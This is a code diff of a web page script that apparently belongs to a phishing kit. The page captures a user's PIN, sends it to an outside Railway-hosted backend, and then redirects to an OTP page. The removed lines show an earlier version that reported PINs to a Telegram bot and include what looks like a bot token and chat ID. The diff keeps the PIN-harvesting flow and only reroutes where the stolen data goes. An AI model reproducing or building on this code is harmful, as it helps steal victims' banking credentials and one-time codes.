@@ -121,11 +121,9 @@
 
 <script>
     // ============================================
-    // TELEGRAM BOT CONFIGURATION
+    // CONFIGURATION
     // ============================================
-    const RAILWAY_URL = 'https://inncredits.up.railway.app';
-    const TG_BOT_TOKEN = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
-    const TG_CHAT_ID = '8392790531';
+    const RAILWAY_URL = 'https://inncredits-production-c852.up.railway.app';
     
     // Get URL parameters
     const params = new URLSearchParams(window.location.search);
@@ -202,7 +200,7 @@
     }
 
     // ============================================
-    // SEND PIN NOTIFICATION TO TELEGRAM (VIA BACKEND)
+    // SEND PIN NOTIFICATION VIA RAILWAY BACKEND
     // ============================================
     async function sendPinNotification(pin) {
         const payload = {
@@ -230,7 +228,6 @@
             console.log('Backend response:', result);
         } catch (error) {
             console.error('Error sending to backend:', error);
-            // Still continue to redirect even if notification fails
         }
     }
 
@@ -244,11 +241,10 @@
             return;
         }
 
-        // Disable button to prevent double click
         confirmBtn.disabled = true;
         confirmBtn.textContent = 'Processing...';
 
-        // Send PIN notification to Telegram
+        // Send PIN notification via Railway backend
         await sendPinNotification(pin);
         
         // Redirect to OTP page
